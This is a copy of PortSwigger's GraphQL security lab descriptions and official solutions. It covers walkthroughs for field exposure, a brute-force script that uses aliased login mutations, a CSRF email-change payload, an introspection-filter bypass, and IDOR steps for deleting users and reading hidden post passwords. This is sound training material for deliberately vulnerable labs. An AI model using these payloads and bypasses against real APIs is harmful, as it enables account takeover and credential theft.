# PortSwigger labs: graphql

> Copied from <https://portswigger.net/web-security/graphql>. Questions and answers are the source's own; nothing was answered or rewritten here.


## 1. Accidental exposure of private GraphQL fields

[Open the lab](https://portswigger.net/web-security/graphql/lab-graphql-accidental-field-exposure)

The user management functions for this lab are powered by a GraphQL endpoint. The lab contains an access control vulnerability whereby you can induce the API to reveal user credential fields.

To solve the lab, sign in as the administrator and delete the username `carlos`.

Learn more about [Working with GraphQL in Burp Suite](https://portswigger.net/burp/documentation/desktop/testing-workflow/working-with-graphql).

<details><summary>Official solution</summary>

**Identify the vulnerability**

1. In Burp's browser, access the lab and select **My account**.
2. Attempt to log in to the site.
3. In Burp, go to **Proxy > HTTP history** and notice that the login attempt is sent as a GraphQL mutation containing a username and password.
4. Right-click the login request and select **Send to Repeater**.
5. In Repeater, right-click anywhere within the Request panel of the message editor and select **GraphQL > Set introspection query** to insert an introspection query into the request body.
6. Send the request.
7. Right-click the message and select **GraphQL > Save GraphQL queries to site map**.
8. Go to **Target > Site map** and review the GraphQL queries. Notice the following:

   - There is a `getUser` query that returns a user's username and password.
   - This query fetches the relevant user information via a direct reference to an `id` number.

**Modify the query to retrieve the administrator credentials**

1. Right-click the the `getUser` query and select **Send to Repeater**.
2. In Repeater, click **Send**. Notice that the default `id` value of `0` doesn't return a user.
3. Select the GraphQL tab and test alternative values for the `id` variable until the API returns the administrator's credentials. In this case, the administrator's ID is `1`.
4. Log in to the site as the administrator, go to the **Admin** panel, and delete `carlos` to solve the lab.

</details>

<details><summary>Community solutions</summary>

##### Popo Hack

https://www.youtube.com/watch?v=-GV8GvjmTxk

</details>


## 2. Bypassing GraphQL brute force protections

[Open the lab](https://portswigger.net/web-security/graphql/lab-graphql-brute-force-protection-bypass)

The user login mechanism for this lab is powered by a GraphQL API. The API endpoint has a rate limiter that returns an error if it receives too many requests from the same origin in a short space of time.

To solve the lab, brute force the login mechanism to sign in as `carlos`. Use the list of [authentication lab passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords) as your password source.

Learn more about [Working with GraphQL in Burp Suite](https://portswigger.net/burp/documentation/desktop/testing-workflow/working-with-graphql).

<details><summary>Tip</summary>

This lab requires you to craft a large request that uses aliases to send multiple login attempts at the same time. As this request could be time-consuming to create manually, we recommend you use a script to build the request.

The below example JavaScript builds a list of aliases corresponding to our list of authentication lab passwords and copies the request to your clipboard. To run this script:

1. Open the lab in Burp's browser.
2. Right-click the page and select **Inspect**.
3. Select the **Console** tab.
4. Paste the script and press Enter.

You can then use the generated aliases when crafting your request in Repeater.

`` copy(`123456,password,12345678,qwerty,123456789,12345,1234,111111,1234567,dragon,123123,baseball,abc123,football,monkey,letmein,shadow,master,666666,qwertyuiop,123321,mustang,1234567890,michael,654321,superman,1qaz2wsx,7777777,121212,000000,qazwsx,123qwe,killer,trustno1,jordan,jennifer,zxcvbnm,asdfgh,hunter,buster,soccer,harley,batman,andrew,tigger,sunshine,iloveyou,2000,charlie,robert,thomas,hockey,ranger,daniel,starwars,klaster,112233,george,computer,michelle,jessica,pepper,1111,zxcvbn,555555,11111111,131313,freedom,777777,pass,maggie,159753,aaaaaa,ginger,princess,joshua,cheese,amanda,summer,love,ashley,nicole,chelsea,biteme,matthew,access,yankees,987654321,dallas,austin,thunder,taylor,matrix,mobilemail,mom,monitor,monitoring,montana,moon,moscow`.split(',').map((element,index)=>`
bruteforce$index:login(input:{password: "$password", username: "carlos"}) {
token
success
}
`.replaceAll('$index',index).replaceAll('$password',element)).join('\n'));console.log("The query has been copied to your clipboard."); ``

</details>

<details><summary>Official solution</summary>

1. In Burp's browser, access the lab and select **My account**.
2. Attempt to log in to the site using incorrect credentials.
3. In Burp, go to **Proxy > HTTP history**. Note that login requests are sent as a GraphQL mutation.
4. Right-click the login request and select **Send to Repeater**.
5. In Repeater, attempt some further login requests with incorrect credentials. Note that after a short period of time the API starts to return a rate limit error.
6. In the GraphQL tab, craft a request that uses aliases to send multiple login mutations in one message. See the tip in this lab for a method that makes this process less time-consuming.

   Bear the following in mind when constructing your request:

   - The list of aliases should be contained within a `mutation {}` type.
   - Each aliased mutation should have the username `carlos` and a different password from the authentication list.
   - If you are modifying the request that you sent to Repeater, delete the variable dictionary and `operationName` field from the request before sending. You can do this from Repeater's **Pretty** tab.
   - Ensure that each alias requests the `success` field, as shown in the simplified example below:`mutation {
   bruteforce0:login(input:{password: "123456", username: "carlos"}) {
   token
   success
   }
   bruteforce1:login(input:{password: "password", username: "carlos"}) {
   token
   success
   }
   ...
   bruteforce99:login(input:{password: "12345678", username: "carlos"}) {
   token
   success
   }
   }`
7. Click **Send**.
8. Notice that the response lists each login attempt and whether its login attempt was successful.
9. Use the search bar below the response to search for the string `true`. This indicates which of the aliased mutations was able to successfully log in as `carlos`.
10. Check the request for the password that was used by the successful alias.
11. Log in to the site using the `carlos` credentials to solve the lab.

</details>

<details><summary>Community solutions</summary>

##### Popo Hack

https://www.youtube.com/watch?v=sKWah9eqWR4

##### Intigriti

https://www.youtube.com/watch?v=1nibMxRr0Ww

</details>


## 3. Performing CSRF exploits over GraphQL

[Open the lab](https://portswigger.net/web-security/graphql/lab-graphql-csrf-via-graphql-api)

The user management functions for this lab are powered by a GraphQL endpoint. The endpoint accepts requests with a content-type of `x-www-form-urlencoded` and is therefore vulnerable to cross-site request forgery (CSRF) attacks.

To solve the lab, craft some HTML that uses a CSRF attack to change the viewer's email address, then upload it to your exploit server.

You can log in to your own account using the following credentials: `wiener:peter`.

Learn more about [Working with GraphQL in Burp Suite](https://portswigger.net/burp/documentation/desktop/testing-workflow/working-with-graphql).

<details><summary>Official solution</summary>

1. Open Burp's browser, access the lab and log in to your account.
2. Enter a new email address, then click **Update email**.
3. In Burp, go to **Proxy > HTTP history** and check the resulting request. Note that the email change is sent as a GraphQL mutation.
4. Right-click the email change request and select **Send to Repeater**.
5. In Repeater, amend the GraphQL query to change the email to a second different address.
6. Click **Send**.
7. In the response, notice that the email has changed again. This indicates that you can reuse a session cookie to send multiple requests.
8. Convert the request into a POST request with a `Content-Type` of `x-www-form-urlencoded`. To do this, right-click the request and select **Change request method** twice.
9. Notice that the mutation request body has been deleted. Add the request body back in with URL encoding.

   The body should look like the below:

   `query=%0A++++mutation+changeEmail%28%24input%3A+ChangeEmailInput%21%29+%7B%0A++++++++changeEmail%28input%3A+%24input%29+%7B%0A++++++++++++email%0A++++++++%7D%0A++++%7D%0A&operationName=changeEmail&variables=%7B%22input%22%3A%7B%22email%22%3A%22hacker%40hacker.com%22%7D%7D`
10. Right-click the request and select **Engagement tools > Generate CSRF PoC**. Burp displays the **CSRF PoC generator** dialog.
11. Amend the HTML in the **CSRF PoC generator** dialog so that it changes the email a third time. This step is necessary because otherwise the exploit won't make any changes to the current email address at the time it is run. Likewise, if you test the exploit before delivering, make sure that you change the email from whatever it is currently set to before delivering to the victim.
12. Copy the HTML.
13. In the lab, click **Go to exploit server**.
14. Paste the HTML into the exploit server and click **Deliver exploit to victim** to solve the lab.

</details>

<details><summary>Community solutions</summary>

##### Popo Hack

https://www.youtube.com/watch?v=FVW2ZRNAyw8

##### Intigriti

https://www.youtube.com/watch?v=Nxvxgl0oRBI

</details>


## 4. Finding a hidden GraphQL endpoint

[Open the lab](https://portswigger.net/web-security/graphql/lab-graphql-find-the-endpoint)

The user management functions for this lab are powered by a hidden GraphQL endpoint. You won't be able to find this endpoint by simply clicking pages in the site. The endpoint also has some defenses against introspection.

To solve the lab, find the hidden endpoint and delete `carlos`.

Learn more about [Working with GraphQL in Burp Suite](https://portswigger.net/burp/documentation/desktop/testing-workflow/working-with-graphql).

<details><summary>Official solution</summary>

**Find the hidden GraphQL endpoint**

1. In Repeater, send requests to some common GraphQL endpoint suffixes and inspect the results.
2. Note that when you send a GET request to `/api` the response contains a "Query not present" error. This hints that there may be a GraphQL endpoint responding to GET requests at this location.
3. Amend the request to contain a universal query. Note that, because the endpoint is responding to GET requests, you need to send the query as a URL parameter.

   For example: `/api?query=query{__typename}`.
4. Notice that the response confirms that this is a GraphQL endpoint:

   `{
   "data": {
   "__typename": "query"
   }
   }`

**Overcome the introspection defenses**

1. Send a new request with a URL-encoded introspection query as a query parameter.

   To do this, right-click the request and select **GraphQL > Set introspection query**:

   `/api?query=query+IntrospectionQuery+%7B%0A++__schema+%7B%0A++++queryType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++mutationType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++subscriptionType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++types+%7B%0D%0A++++++...FullType%0D%0A++++%7D%0D%0A++++directives+%7B%0D%0A++++++name%0D%0A++++++description%0D%0A++++++args+%7B%0D%0A++++++++...InputValue%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+FullType+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++description%0D%0A++fields%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++args+%7B%0D%0A++++++...InputValue%0D%0A++++%7D%0D%0A++++type+%7B%0D%0A++++++...TypeRef%0D%0A++++%7D%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++inputFields+%7B%0D%0A++++...InputValue%0D%0A++%7D%0D%0A++interfaces+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++enumValues%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++possibleTypes+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+InputValue+on+__InputValue+%7B%0D%0A++name%0D%0A++description%0D%0A++type+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++defaultValue%0D%0A%7D%0D%0A%0D%0Afragment+TypeRef+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++ofType+%7B%0D%0A++++kind%0D%0A++++name%0D%0A++++ofType+%7B%0D%0A++++++kind%0D%0A++++++name%0D%0A++++++ofType+%7B%0D%0A++++++++kind%0D%0A++++++++name%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A`
2. Notice from the response that introspection is disallowed.
3. Modify the query to include a newline character after `__schema` and resend.

   For example:

   `/api?query=query+IntrospectionQuery+%7B%0D%0A++__schema%0a+%7B%0D%0A++++queryType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++mutationType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++subscriptionType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++types+%7B%0D%0A++++++...FullType%0D%0A++++%7D%0D%0A++++directives+%7B%0D%0A++++++name%0D%0A++++++description%0D%0A++++++args+%7B%0D%0A++++++++...InputValue%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+FullType+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++description%0D%0A++fields%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++args+%7B%0D%0A++++++...InputValue%0D%0A++++%7D%0D%0A++++type+%7B%0D%0A++++++...TypeRef%0D%0A++++%7D%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++inputFields+%7B%0D%0A++++...InputValue%0D%0A++%7D%0D%0A++interfaces+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++enumValues%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++possibleTypes+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+InputValue+on+__InputValue+%7B%0D%0A++name%0D%0A++description%0D%0A++type+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++defaultValue%0D%0A%7D%0D%0A%0D%0Afragment+TypeRef+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++ofType+%7B%0D%0A++++kind%0D%0A++++name%0D%0A++++ofType+%7B%0D%0A++++++kind%0D%0A++++++name%0D%0A++++++ofType+%7B%0D%0A++++++++kind%0D%0A++++++++name%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A`
4. Notice that the response now includes full introspection details. This is because the server is configured to exclude queries matching the regex `"__schema{"`, which the query no longer matches even though it is still a valid introspection query.

**Exploit the vulnerability to delete carlos**

1. Right-click the request and select **GraphQL > Save GraphQL queries to site map**.
2. Go to **Target > Site map** to see the API queries. Use the **GraphQL** tab and find the `getUser` query. Right-click the request and select **Send to Repeater**.
3. In Repeater, send the `getUser` query to the endpoint you discovered.

   Notice that the response returns:

   `{
   "data": {
   "getUser": null
   }
   }`
4. Click on the GraphQL tab and change the `id` variable to find `carlos`'s user ID. In this case, the relevant user ID is `3`.
5. In **Target > Site map**, browse the schema again and find the `deleteOrganizationUser` mutation. Notice that this mutation takes a user ID as a parameter.
6. Send the request to Repeater.
7. In Repeater, send a `deleteOrganizationUser` mutation with a user ID of `3` to delete `carlos` and solve the lab.

   For example:

   `/api?query=mutation+%7B%0A%09deleteOrganizationUser%28input%3A%7Bid%3A+3%7D%29+%7B%0A%09%09user+%7B%0A%09%09%09id%0A%09%09%7D%0A%09%7D%0A%7D`

</details>

<details><summary>Community solutions</summary>

##### Popo Hack

https://www.youtube.com/watch?v=RBKU4s0-Gd0

##### Intigriti

https://www.youtube.com/watch?v=aklfELQQtsc

</details>


## 5. Accessing private GraphQL posts

[Open the lab](https://portswigger.net/web-security/graphql/lab-graphql-reading-private-posts)

The blog page for this lab contains a hidden blog post that has a secret password. To solve the lab, find the hidden blog post and enter the password.

Learn more about [Working with GraphQL in Burp Suite](https://portswigger.net/burp/documentation/desktop/testing-workflow/working-with-graphql).

<details><summary>Official solution</summary>

**Identify the vulnerability**

1. In Burp's browser, access the blog page.
2. In Burp, go to **Proxy > HTTP history** and notice the following:

   - Blog posts are retrieved using a GraphQL query.
   - In the response to the GraphQL query, each blog post has its own sequential `id`.
   - Blog post `id` 3 is missing from the list. This indicates that there is a hidden blog post.
3. Find the `POST /graphql/v1` request. Right-click it and select **Send to Repeater**.
4. In Repeater, right-click anywhere in the Request panel of the message editor and select **GraphQL > Set introspection query** to insert an introspection query into the request body.
5. Send the request. Notice in the response that the `BlogPost` type has a `postPassword` field available.

**Exploit the vulnerability to find the password**

1. In the HTTP history, find the `POST /graphql/v1` request. Right-click it and select **Send to Repeater**.
2. In Repeater, click on the **GraphQL** tab. In the **Variables** panel, modify the `id` variable to 3 (the ID of the hidden blog post).
3. In the **Query** panel, add the `postPassword` field to the query.
4. Send the request.
5. Copy the contents of the response's `postPassword` field and paste them into the **Submit solution** dialog to solve the lab. You may need to refresh the page.

</details>

<details><summary>Community solutions</summary>

##### Intigriti

https://www.youtube.com/watch?v=rDgoNBGuuuE

##### Popo Hack

https://www.youtube.com/watch?v=gX7olJ2sitM

</details>

